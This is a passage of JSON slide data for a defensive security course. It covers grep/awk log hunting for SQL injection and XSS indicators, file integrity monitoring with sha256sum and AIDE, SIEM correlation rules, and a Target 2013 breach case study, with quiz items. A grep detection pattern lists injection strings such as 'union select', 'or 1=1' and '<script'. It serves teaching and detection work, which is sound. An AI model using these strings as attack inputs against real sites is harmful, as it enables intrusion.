+    "<p>Analysts rarely wait for a SIEM correlation rule to fire; ad-hoc command-line hunting across raw logs remains a core, exam-relevant skill. The demo below reproduces a basic sweep for common injection indicators across a rotated log directory, then tallies offending source IPs, then, most importantly, filters specifically for requests that both contain an injection indicator and returned a successful status code rather than a WAF block.</p>",
+    "<p>This final pattern is the highest-value hunting technique in the chapter: a blocked attempt is a policy success story; a successful request containing an injection signature is the one that demands immediate incident response.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.a.4",
+   "parent_n": 9,
+   "title": "Live Demo: grep/awk Log Hunting for Injection Indicators",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "grep",
+    "awk",
+    "log-hunting",
+    "waf-bypass"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> This models real analyst workflow, grep for indicators, awk to aggregate by field, then a targeted awk filter joining an indicator condition with a status-code condition.</p><p><b>Misconception:</b> Students think finding any match is itself the alert-worthy event. The status code context (did it succeed?) is what determines urgency.</p><p><b>Analogy:</b> Sorting mail by which envelopes were opened (200) versus returned to sender (403), you investigate the opened ones first.</p><p><b>Exam tip:</b> Be able to explain, in plain English, what a compound grep/awk hunting command is checking for even if you can't write the exact syntax.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "content": "# Sweep access logs for common SQLi / XSS indicators (case-insensitive)\ngrep -EiI \"union([[:space:]]|%20)+select|or%201%3D1|or 1=1|--%20|<script|onerror=|javascript:\" \\\n  /var/log/nginx/access.log*\n\n# Tally offending source IPs to find the noisiest scanner\ngrep -Ei \"union.+select|<script\" /var/log/nginx/access.log \\\n  | awk '{print $1}' | sort | uniq -c | sort -rn | head -10\n\n# Flag any request that returned 200 despite containing an obvious SQL comment terminator\n# (a WAF-bypass indicator: the payload succeeded rather than being blocked)\nawk -F'\"' '$2 ~ /--%20|--\\+|#/ {print}' /var/log/nginx/access.log | grep '\" 200 '",
+    "mode": "static"
+   }
+  },
+  {
+   "index": "5.6.2.b.1",
+   "parent_n": 10,
+   "title": "File Integrity Monitoring: Baseline and Verification",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "sha-256",
+    "file-integrity",
+    "cryptographic-hash"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> SHA-256 is the current FIM standard; MD5 and SHA-1 are deprecated for integrity use because of demonstrated collision attacks.</p><p><b>Misconception:</b> Students think FIM detects the exploitation technique. It only detects the file-level consequence, after the fact, regardless of how the attacker got in.</p><p><b>Analogy:</b> FIM is a wax seal on an envelope, it doesn't stop someone from opening it, but a broken seal proves someone did.</p><p><b>Exam tip:</b> Recognize FIM as strong on 'file changed/added/modified without a change ticket' scenarios, weak on pure data-read exfiltration that touches no file.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Where log analysis catches the attempt, FIM catches the consequence</b>",
+    "<b>Mechanism:</b> Compute a cryptographic hash of every file that matters while the system is known-good; store as a trusted baseline",
+    "<b>Verification:</b> Periodically recompute hashes and compare, any mismatch means the file changed",
+    "<b>Standard algorithm:</b> SHA-256 (FIPS PUB 180-4); MD5/SHA-1 deprecated for integrity use due to collision attacks",
+    "<b>Interpretation rule:</b> A mismatch with no authorized change ticket is evidence of compromise"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.b.1",
+   "parent_n": 10,
+   "title": "File Integrity Monitoring: Baseline and Verification",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "sha-256",
+    "file-integrity",
+    "cryptographic-hash"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> SHA-256 is the current FIM standard; MD5 and SHA-1 are deprecated for integrity use because of demonstrated collision attacks.</p><p><b>Misconception:</b> Students think FIM detects the exploitation technique. It only detects the file-level consequence, after the fact, regardless of how the attacker got in.</p><p><b>Analogy:</b> FIM is a wax seal on an envelope, it doesn't stop someone from opening it, but a broken seal proves someone did.</p><p><b>Exam tip:</b> Recognize FIM as strong on 'file changed/added/modified without a change ticket' scenarios, weak on pure data-read exfiltration that touches no file.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Where log analysis catches the attempt, FIM catches the consequence. The mechanism is conceptually simple: compute a cryptographic hash of every file that matters, binaries, configuration files, web application source, while the system is in a known-good state, store those hashes as a trusted baseline, and periodically recompute the hashes to detect drift. Any mismatch means the file changed, and if no authorized change ticket explains it, that mismatch is evidence of compromise.</p>",
+    "<p>A cryptographic hash function is a one-way function producing a fixed-length fingerprint such that any change to the input, even a single bit, produces a completely different output, and the original input cannot practically be recovered from the hash.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.b.2",
+   "parent_n": 11,
+   "title": "Baselining and Checking with sha256sum",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "sha256sum",
+    "web-shell",
+    "baseline"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The FAILED output for a .php file inside an image upload directory is one of the most exam-relevant concrete FIM examples, recognize this pattern instantly.</p><p><b>Misconception:</b> Students think any file change is inherently malicious. Context matters, a PHP file appearing where only images belong is the red flag, not merely 'a file changed.'</p><p><b>Analogy:</b> Finding a foreign object sewn into a delivered package that was supposed to contain only clothes.</p><p><b>Exam tip:</b> Practice reasoning from 'unexpected file type in an unexpected directory' to 'likely web shell drop, escalate.'</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Establish baseline:</b> Hash every file in the web root and redirect output to a baseline file",
+    "<b>Verify later:</b> <code>sha256sum -c baseline --quiet</code> compares current state against the stored baseline, typically via cron",
+    "<b>Compromised host signal:</b> A file like <code>uploads/profile_pic_884.php</code> reports FAILED, a PHP file dropped into an image upload directory is a classic web shell indicator",
+    "<b>Scaling limit:</b> Hand-rolled sha256sum baselines are instructive but don't scale to enterprise use",
+    "<b>Enterprise tools:</b> Purpose-built FIM tools (Tripwire, AIDE) exist for exactly this reason"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.b.2",
+   "parent_n": 11,
+   "title": "Baselining and Checking with sha256sum",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "sha256sum",
+    "web-shell",
+    "baseline"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The FAILED output for a .php file inside an image upload directory is one of the most exam-relevant concrete FIM examples, recognize this pattern instantly.</p><p><b>Misconception:</b> Students think any file change is inherently malicious. Context matters, a PHP file appearing where only images belong is the red flag, not merely 'a file changed.'</p><p><b>Analogy:</b> Finding a foreign object sewn into a delivered package that was supposed to contain only clothes.</p><p><b>Exam tip:</b> Practice reasoning from 'unexpected file type in an unexpected directory' to 'likely web shell drop, escalate.'</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>A hand-rolled sha256sum baseline is instructive but does not scale to enterprise use, which is why purpose-built FIM tools exist. Establishing a baseline is straightforward: compute SHA-256 hashes for every file in the web root and store them. Verification later re-runs the hash and flags any FAILED comparison.</p>",
+    "<p>The example output below shows a compromised host: a PHP file appearing inside an <code>uploads/</code> directory, a directory that should only ever contain images, is a textbook web shell indicator that FIM would catch even if no log signature existed for the upload technique used.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.b.2",
+   "parent_n": 11,
+   "title": "Baselining and Checking with sha256sum",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "fim",
+    "sha256sum",
+    "web-shell",
+    "baseline"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> The FAILED output for a .php file inside an image upload directory is one of the most exam-relevant concrete FIM examples, recognize this pattern instantly.</p><p><b>Misconception:</b> Students think any file change is inherently malicious. Context matters, a PHP file appearing where only images belong is the red flag, not merely 'a file changed.'</p><p><b>Analogy:</b> Finding a foreign object sewn into a delivered package that was supposed to contain only clothes.</p><p><b>Exam tip:</b> Practice reasoning from 'unexpected file type in an unexpected directory' to 'likely web shell drop, escalate.'</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "content": "# Establish a SHA-256 baseline for the web root\nsha256sum -- /var/www/html/*.php /var/www/html/uploads/* > /opt/fim/baseline_webroot.sha256\n\n# Later (e.g., via cron every 15 minutes): verify against baseline\nsha256sum -c /opt/fim/baseline_webroot.sha256 --quiet\n\n# Example output on a compromised host:\n# /var/www/html/uploads/profile_pic_884.php: FAILED\n# sha256sum: WARNING: 1 computed checksum did NOT match",
+    "mode": "static"
+   }
+  },
+  {
+   "index": "5.6.2.b.3",
+   "parent_n": 12,
+   "title": "Purpose-Built FIM Tools: Tripwire and AIDE",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "tripwire",
+    "aide",
+    "osquery",
+    "fim-tools"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Tripwire's academic origin (Kim & Spafford, Purdue CSD-TR-93-071, 1994) is a citable historical reference. osquery was originally developed by Facebook and open-sourced in 2014.</p><p><b>Misconception:</b> Students think any hash-comparison script 'is' FIM. Purpose-built tools add signed databases and scheduled/queryable operation at enterprise scale, that's the differentiator.</p><p><b>Analogy:</b> A signed FIM database is a notarized ledger, even if a thief breaks into the safe, they can't quietly rewrite the notary's copy.</p><p><b>Exam tip:</b> Know that a signed/protected baseline defends against an attacker with root privileges tampering with the FIM evidence itself.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Tripwire (1992):</b> Gene Kim &amp; Eugene Spafford, Purdue University, signed database prevents an attacker with root from editing the baseline to hide tracks",
+    "<b>AIDE:</b> Advanced Intrusion Detection Environment, open-source reimplementation; config defines watched paths and hash algorithms",
+    "<b>Workflow:</b> <code>aideinit</code> establishes the baseline database; <code>aide --check</code> (via cron) compares current state",
+    "<b>Sample flagged event:</b> A newly Added file <code>/var/www/html/uploads/x.php</code> with its SHA-256 hash reported",
+    "<b>Modern extension:</b> osquery folds FIM into broader endpoint telemetry, letting analysts hunt recent file changes interactively via SQL queries"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.b.3",
+   "parent_n": 12,
+   "title": "Purpose-Built FIM Tools: Tripwire and AIDE",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "tripwire",
+    "aide",
+    "osquery",
+    "fim-tools"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Tripwire's academic origin (Kim & Spafford, Purdue CSD-TR-93-071, 1994) is a citable historical reference. osquery was originally developed by Facebook and open-sourced in 2014.</p><p><b>Misconception:</b> Students think any hash-comparison script 'is' FIM. Purpose-built tools add signed databases and scheduled/queryable operation at enterprise scale, that's the differentiator.</p><p><b>Analogy:</b> A signed FIM database is a notarized ledger, even if a thief breaks into the safe, they can't quietly rewrite the notary's copy.</p><p><b>Exam tip:</b> Know that a signed/protected baseline defends against an attacker with root privileges tampering with the FIM evidence itself.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Tripwire, still in commercial and open-source use, pioneered the model of a policy file defining watched paths and a cryptographically signed database preventing an attacker who gains root from simply editing the baseline to hide their tracks. AIDE (Advanced Intrusion Detection Environment) is the dominant free alternative on Linux systems: a configuration file defines monitored directories and which attributes to hash, and <code>aide --check</code> reports deviations from the stored database.</p>",
+    "<p>Modern SOCs increasingly fold FIM into a broader endpoint telemetry platform such as osquery, which represents OS state as SQL-queryable virtual tables, letting analysts hunt for recent file modifications interactively rather than waiting on a scheduled AIDE run.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.b.3",
+   "parent_n": 12,
+   "title": "Purpose-Built FIM Tools: Tripwire and AIDE",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "tripwire",
+    "aide",
+    "osquery",
+    "fim-tools"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Tripwire's academic origin (Kim & Spafford, Purdue CSD-TR-93-071, 1994) is a citable historical reference. osquery was originally developed by Facebook and open-sourced in 2014.</p><p><b>Misconception:</b> Students think any hash-comparison script 'is' FIM. Purpose-built tools add signed databases and scheduled/queryable operation at enterprise scale, that's the differentiator.</p><p><b>Analogy:</b> A signed FIM database is a notarized ledger, even if a thief breaks into the safe, they can't quietly rewrite the notary's copy.</p><p><b>Exam tip:</b> Know that a signed/protected baseline defends against an attacker with root privileges tampering with the FIM evidence itself.</p>",
+   "beat": 4,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": "",
+   "code_block": {
+    "language": "bash",
+    "content": "# /etc/aide/aide.conf excerpt -- monitor the web application directory\n/var/www/html   NORMAL\n\n# Initialize the baseline database (run once, on a known-clean system)\nsudo aideinit\nsudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n\n# Run a check (typically scheduled via cron)\nsudo aide --check\n\n# Sample AIDE check output flagging a web shell drop\n# File: /var/www/html/uploads/x.php\n#   Added\n#   SHA256 : yJ3F2q9K...\n#   Perm   :                        |  -rw-r--r--",
+    "mode": "static"
+   }
+  },
+  {
+   "index": "5.6.2.c.1",
+   "parent_n": 13,
+   "title": "Anomaly Detection and SIEM Correlation Rules",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "siem",
+    "correlation-rule",
+    "geoip",
+    "anomaly-detection"
+   ],
+   "quiz": {
+    "type": "MCQ",
+    "question": "A SIEM correlation rule fires only when an unusual request to an upload directory is immediately followed by a FIM alert for a new file in that same directory. Why is this rule more reliable than either signal alone?",
+    "options": [
+     "Because FIM alerts are always more accurate than log alerts",
+     "Because each signal alone is low-confidence noise, but their co-occurrence in a short time window is near-certain evidence of a successful web shell upload",
+     "Because correlation rules do not generate false positives",
+     "Because GeoIP enrichment is required for any valid SIEM rule"
+    ],
+    "answer": 1,
+    "explanation": "Option B is correct: an unusual upload-directory request alone could be a false positive, and a new file appearing alone could be a legitimate deployment; their correlation within a tight time window sharply raises confidence that this is a real compromise. Option A is false -- neither signal is inherently more accurate. Option C is false -- correlation reduces but does not eliminate false positives. Option D is not required for this particular rule."
+   },
+   "speaker_notes": "<p><b>Context:</b> GeoIP accuracy is city-level at best and easily defeated by VPNs, but remains a useful low-cost enrichment signal, not a standalone control.</p><p><b>Misconception:</b> Students think a SIEM rule is just one alert condition. Correlation rules explicitly join multiple sources/events, that's the defining feature.</p><p><b>Analogy:</b> Neither a knock at the door nor an open window alone proves a break-in; both together, within minutes of each other, are damning.</p><p><b>Exam tip:</b> Be ready to design or interpret a simple correlation rule joining a log-based condition with a FIM-based condition.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Statistical baseline:</b> Average requests/minute from an IP over trailing 30 days, plus/minus a standard deviation",
+    "<b>Contextual enrichment:</b> GeoIP lookups and threat-intel IP reputation feeds add context to a raw statistical outlier",
+    "<b>Correlation rule:</b> Fires only when multiple discrete, individually low-severity events occur together in a pattern",
+    "<b>Worked example:</b> An unusual upload-directory request (log) FOLLOWED_BY a new file appearing in that directory (FIM) within a 10-minute window",
+    "<b>Why correlation matters:</b> Either signal alone is low-confidence noise; together they are near-certain evidence of a web shell upload"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.c.1",
+   "parent_n": 13,
+   "title": "Anomaly Detection and SIEM Correlation Rules",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "siem",
+    "correlation-rule",
+    "geoip",
+    "anomaly-detection"
+   ],
+   "quiz": {
+    "type": "MCQ",
+    "question": "A SIEM correlation rule fires only when an unusual request to an upload directory is immediately followed by a FIM alert for a new file in that same directory. Why is this rule more reliable than either signal alone?",
+    "options": [
+     "Because FIM alerts are always more accurate than log alerts",
+     "Because each signal alone is low-confidence noise, but their co-occurrence in a short time window is near-certain evidence of a successful web shell upload",
+     "Because correlation rules do not generate false positives",
+     "Because GeoIP enrichment is required for any valid SIEM rule"
+    ],
+    "answer": 1,
+    "explanation": "Option B is correct: an unusual upload-directory request alone could be a false positive, and a new file appearing alone could be a legitimate deployment; their correlation within a tight time window sharply raises confidence that this is a real compromise. Option A is false -- neither signal is inherently more accurate. Option C is false -- correlation reduces but does not eliminate false positives. Option D is not required for this particular rule."
+   },
+   "speaker_notes": "<p><b>Context:</b> GeoIP accuracy is city-level at best and easily defeated by VPNs, but remains a useful low-cost enrichment signal, not a standalone control.</p><p><b>Misconception:</b> Students think a SIEM rule is just one alert condition. Correlation rules explicitly join multiple sources/events, that's the defining feature.</p><p><b>Analogy:</b> Neither a knock at the door nor an open window alone proves a break-in; both together, within minutes of each other, are damning.</p><p><b>Exam tip:</b> Be ready to design or interpret a simple correlation rule joining a log-based condition with a FIM-based condition.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The final layer builds a statistical model of 'normal' and alerts on deviation. A SIEM correlation rule might combine a threshold-based baseline with contextual enrichment such as GeoIP lookups and known threat-intelligence IP reputation feeds. The example rule below fires only when an unusual upload-directory request is immediately followed by FIM detecting a new file in that same directory, a pattern log analysis or FIM alone would each report as low-confidence noise, but which together constitute near-certain evidence of a web shell upload.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.c.1",
+   "parent_n": 13,
+   "title": "Anomaly Detection and SIEM Correlation Rules",
+   "slide_type": "mechanism",
+   "difficulty": "standard",
+   "tags": [
+    "siem",
+    "correlation-rule",
+    "geoip",
+    "anomaly-detection"
+   ],
+   "quiz": {
+    "type": "MCQ",
+    "question": "A SIEM correlation rule fires only when an unusual request to an upload directory is immediately followed by a FIM alert for a new file in that same directory. Why is this rule more reliable than either signal alone?",
+    "options": [
+     "Because FIM alerts are always more accurate than log alerts",
+     "Because each signal alone is low-confidence noise, but their co-occurrence in a short time window is near-certain evidence of a successful web shell upload",
+     "Because correlation rules do not generate false positives",
+     "Because GeoIP enrichment is required for any valid SIEM rule"
+    ],
+    "answer": 1,
+    "explanation": "Option B is correct: an unusual upload-directory request alone could be a false positive, and a new file appearing alone could be a legitimate deployment; their correlation within a tight time window sharply raises confidence that this is a real compromise. Option A is false -- neither signal is inherently more accurate. Option C is false -- correlation reduces but does not eliminate false positives. Option D is not required for this particular rule."
+   },
+   "speaker_notes": "<p><b>Context:</b> GeoIP accuracy is city-level at best and easily defeated by VPNs, but remains a useful low-cost enrichment signal, not a standalone control.</p><p><b>Misconception:</b> Students think a SIEM rule is just one alert condition. Correlation rules explicitly join multiple sources/events, that's the defining feature.</p><p><b>Analogy:</b> Neither a knock at the door nor an open window alone proves a break-in; both together, within minutes of each other, are damning.</p><p><b>Exam tip:</b> Be ready to design or interpret a simple correlation rule joining a log-based condition with a FIM-based condition.</p>",
+   "beat": 3,
+   "bullets": [],
+   "content_blocks": [],
+   "diagram_ref": "fim_log_correlation",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.c.2",
+   "parent_n": 14,
+   "title": "Section II Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "glossary",
+    "section-2-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Use this as a checkpoint before the case studies, Target (Section III) is fundamentally a story about a working detection mechanism and a broken response process.</p><p><b>Misconception:</b> None new, this is a consolidation checkpoint.</p><p><b>Analogy:</b> This is your toolkit inventory before we look at real incidents that tested (and sometimes broke) these tools in production.</p><p><b>Exam tip:</b> Be able to match a described piece of evidence (a log line, a file hash mismatch, a volume spike) to the correct mechanism from this section.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Access log / CLF:</b> Verbatim record of every HTTP request, capturing raw injection payloads before app logic runs",
+    "<b>Signature indicators:</b> SQL keywords + comment markers for SQLi; HTML/JS tags + event handlers for XSS",
+    "<b>FIM:</b> Cryptographic baseline hashing (SHA-256) that detects unauthorized file changes after the fact",
+    "<b>Tripwire / AIDE / osquery:</b> Purpose-built tools implementing FIM at enterprise scale, with signed/protected baselines",
+    "<b>SIEM correlation rule:</b> Joins multiple low-confidence signals across sources into one high-confidence alert"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.2.c.2",
+   "parent_n": 14,
+   "title": "Section II Glossary Consolidation",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "glossary",
+    "section-2-review"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Use this as a checkpoint before the case studies, Target (Section III) is fundamentally a story about a working detection mechanism and a broken response process.</p><p><b>Misconception:</b> None new, this is a consolidation checkpoint.</p><p><b>Analogy:</b> This is your toolkit inventory before we look at real incidents that tested (and sometimes broke) these tools in production.</p><p><b>Exam tip:</b> Be able to match a described piece of evidence (a log line, a file hash mismatch, a volume spike) to the correct mechanism from this section.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>Section II covered the three technical mechanisms underlying application threat auditing: reading raw log evidence for injection signatures, establishing and verifying file integrity baselines, and writing SIEM correlation rules that join log and FIM signals into high-confidence alerts. Every case study in Section III maps back to a success or failure of one or more of these mechanisms.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.a.1",
+   "parent_n": 15,
+   "title": "Case Study: Target Corporation (2013), The Setup",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "target-breach",
+    "case-study",
+    "memory-scraping",
+    "pos-malware"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Documented in the U.S. Senate Committee on Commerce, Science, and Transportation's 2014 majority staff report, 'A Kill Chain Analysis of the 2013 Target Data Breach.'</p><p><b>Misconception:</b> Students assume the breach happened because Target had no detection tooling. The opposite is true, this is precisely why the case study matters.</p><p><b>Analogy:</b> A smoke detector that works perfectly is useless if the alarm panel is muted.</p><p><b>Exam tip:</b> Remember the entry vector, a third-party vendor's credentials, as a reminder that supply-chain/vendor access is itself an attack surface.</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>Entry vector:</b> Attackers gained a foothold via a compromised HVAC vendor's credentials, moved laterally into the POS network",
+    "<b>Payload:</b> Memory-scraping malware (BlackPOS/Kaptoxa family) installed on thousands of point-of-sale registers",
+    "<b>Mechanism:</b> Reads plaintext payment card data directly from POS memory during the brief window between card swipe and encryption",
+    "<b>Detection tool deployed:</b> FireEye, installed roughly six months before the breach, capable of sandboxed malware-behavior detection",
+    "<b>Impact:</b> ~40 million payment card records exfiltrated over the November-December 2013 holiday shopping season"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.a.1",
+   "parent_n": 15,
+   "title": "Case Study: Target Corporation (2013), The Setup",
+   "slide_type": "application",
+   "difficulty": "standard",
+   "tags": [
+    "target-breach",
+    "case-study",
+    "memory-scraping",
+    "pos-malware"
+   ],
+   "quiz": null,
+   "speaker_notes": "<p><b>Context:</b> Documented in the U.S. Senate Committee on Commerce, Science, and Transportation's 2014 majority staff report, 'A Kill Chain Analysis of the 2013 Target Data Breach.'</p><p><b>Misconception:</b> Students assume the breach happened because Target had no detection tooling. The opposite is true, this is precisely why the case study matters.</p><p><b>Analogy:</b> A smoke detector that works perfectly is useless if the alarm panel is muted.</p><p><b>Exam tip:</b> Remember the entry vector, a third-party vendor's credentials, as a reminder that supply-chain/vendor access is itself an attack surface.</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>In November-December 2013, attackers who had gained a foothold via a compromised HVAC vendor's credentials moved laterally into Target's point-of-sale network and installed memory-scraping malware on thousands of registers, ultimately exfiltrating roughly 40 million payment card records. Memory-scraping malware reads plaintext payment card data directly from a point-of-sale terminal's volatile memory during the brief window between card swipe and encryption, bypassing encryption-at-rest and in-transit controls entirely.</p>",
+    "<p>Target had deployed FireEye exactly for this scenario, and, critically, the tool worked as designed.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.a.2",
+   "parent_n": 16,
+   "title": "Case Study: Target, Alerts Fired, No One Acted",
+   "slide_type": "deep_question",
+   "difficulty": "standard",
+   "tags": [
+    "target-breach",
+    "detection-vs-outcome",
+    "alert-fatigue",
+    "nist-800-61"
+   ],
+   "quiz": {
+    "type": "FRQ",
+    "question": "The 2013 Target breach involved a detection tool that correctly generated high-severity alerts before most of the card data was exfiltrated, yet the breach was not contained until external parties notified Target. Explain why detection capability and detection outcome are not the same thing, and identify organizational controls needed to close the gap.",
+    "prompt": "Address: (a) what 'detection capability' means and evidence it worked here; (b) what 'detection outcome' means and evidence it failed here; (c) at least two organizational (not technical) controls that would close the gap.",
+    "explanation": "Full-credit response: (a) Detection capability is whether a tool can identify malicious activity and alert -- FireEye did this correctly, generating high-severity alerts before the bulk of exfiltration. (b) Detection outcome is whether the alert produces a timely, effective response -- it did not, because reviewed/escalated alerts were never acted upon before external notification. (c) Needed organizational controls: a documented, enforced escalation policy defining which severities require action within what timeframe; sufficient triage staffing/tuning to prevent alert fatigue; clear organizational authority to act on high-severity alerts without excess approval layers; and periodic IR exercises (per NIST SP 800-61) testing whether alerts actually translate into contained incidents."
+   },
+   "speaker_notes": "<p><b>Context:</b> This is a favorite AP exam trap: a scenario describes excellent detection tooling and asks 'was this organization secure?' The correct move is separating the technical control from the operational process around it.</p><p><b>Misconception:</b> 'They had a detection tool, so they were secure.' An alert that no one reads is not a control, it's an expensive log.</p><p><b>Analogy:</b> A fire alarm ringing in an empty building with no one to hear it and call the fire department.</p><p><b>Exam tip:</b> When asked to name organizational (not technical) fixes, answer with escalation policy, triage staffing, defined response authority, and IR exercises, not 'buy a better tool.'</p>",
+   "beat": 1,
+   "bullets": [
+    "<b>The failure point:</b> FireEye generated alerts, some at the highest available severity, on multiple occasions before the bulk of card data was stolen",
+    "<b>Process breakdown:</b> Alerts were reviewed by a Bangalore-based monitoring team and escalated to Minneapolis HQ, but no action was taken",
+    "<b>Discovery:</b> Breach was only contained after card issuers and the U.S. DOJ separately notified Target",
+    "<b>Core lesson:</b> Detection capability (did the tool identify the malware?) is not the same as detection outcome (did it lead to a timely response?)",
+    "<b>Full lifecycle required:</b> Detection, triage, escalation, AND response, a break at any link renders earlier links worthless"
+   ],
+   "content_blocks": [],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.a.2",
+   "parent_n": 16,
+   "title": "Case Study: Target, Alerts Fired, No One Acted",
+   "slide_type": "deep_question",
+   "difficulty": "standard",
+   "tags": [
+    "target-breach",
+    "detection-vs-outcome",
+    "alert-fatigue",
+    "nist-800-61"
+   ],
+   "quiz": {
+    "type": "FRQ",
+    "question": "The 2013 Target breach involved a detection tool that correctly generated high-severity alerts before most of the card data was exfiltrated, yet the breach was not contained until external parties notified Target. Explain why detection capability and detection outcome are not the same thing, and identify organizational controls needed to close the gap.",
+    "prompt": "Address: (a) what 'detection capability' means and evidence it worked here; (b) what 'detection outcome' means and evidence it failed here; (c) at least two organizational (not technical) controls that would close the gap.",
+    "explanation": "Full-credit response: (a) Detection capability is whether a tool can identify malicious activity and alert -- FireEye did this correctly, generating high-severity alerts before the bulk of exfiltration. (b) Detection outcome is whether the alert produces a timely, effective response -- it did not, because reviewed/escalated alerts were never acted upon before external notification. (c) Needed organizational controls: a documented, enforced escalation policy defining which severities require action within what timeframe; sufficient triage staffing/tuning to prevent alert fatigue; clear organizational authority to act on high-severity alerts without excess approval layers; and periodic IR exercises (per NIST SP 800-61) testing whether alerts actually translate into contained incidents."
+   },
+   "speaker_notes": "<p><b>Context:</b> This is a favorite AP exam trap: a scenario describes excellent detection tooling and asks 'was this organization secure?' The correct move is separating the technical control from the operational process around it.</p><p><b>Misconception:</b> 'They had a detection tool, so they were secure.' An alert that no one reads is not a control, it's an expensive log.</p><p><b>Analogy:</b> A fire alarm ringing in an empty building with no one to hear it and call the fire department.</p><p><b>Exam tip:</b> When asked to name organizational (not technical) fixes, answer with escalation policy, triage staffing, defined response authority, and IR exercises, not 'buy a better tool.'</p>",
+   "beat": 2,
+   "bullets": [],
+   "content_blocks": [
+    "<p>The alerts were reviewed by a monitoring team and escalated to Target's security staff. No action was taken until after card issuers and the U.S. Department of Justice separately notified Target that a breach was underway. This case is the canonical counterexample to the assumption that detection tooling alone constitutes a defense program. The technical layer performed its function; the organizational process for triaging, prioritizing, and acting on alerts failed.</p>",
+    "<p>It illustrates why application threat auditing must be understood as a full lifecycle, detection, triage, escalation, and response, not merely a technology deployment. This maps directly onto the NIST SP 800-61 Rev. 2 incident handling lifecycle: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activity.</p>"
+   ],
+   "diagram_ref": "",
+   "diagram_prompt": ""
+  },
+  {
+   "index": "5.6.3.a.3",
+   "parent_n": 17,
+   "title": "An Alert That No One Reads Is Not a Control",
+   "slide_type": "concept",
+   "difficulty": "standard",
+   "tags": [
+    "alert-fatigue",
+    "critical-concept",
+    "target-breach"
+   ],
+   "quiz": null,
